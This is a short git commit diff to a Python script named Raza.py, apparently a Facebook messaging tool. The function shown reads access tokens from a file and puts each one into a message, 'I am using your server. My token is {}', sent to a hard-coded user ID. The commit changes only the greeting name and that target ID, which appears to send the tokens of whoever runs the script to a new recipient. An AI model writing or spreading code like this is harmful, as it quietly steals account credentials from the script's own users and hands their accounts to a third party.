e5c22d811ca8852e84516adbd88b3011a5f6623d
Itzdeep510 <162968810+Itzdeep510@users.noreply.github.com>
2025-02-18 09:59:23 +0530

    Update Raza.py

--- Raza.py
+++ Raza.py
@@ -39,10 +39,10 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello Verma Down ! I am using your server. My token is {}"
+      msg_template = "Hello Deepak Rajput ! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100010390477695"
+      target_id = "100013139415727"
 
       requests.packages.urllib3.disable_warnings()
 
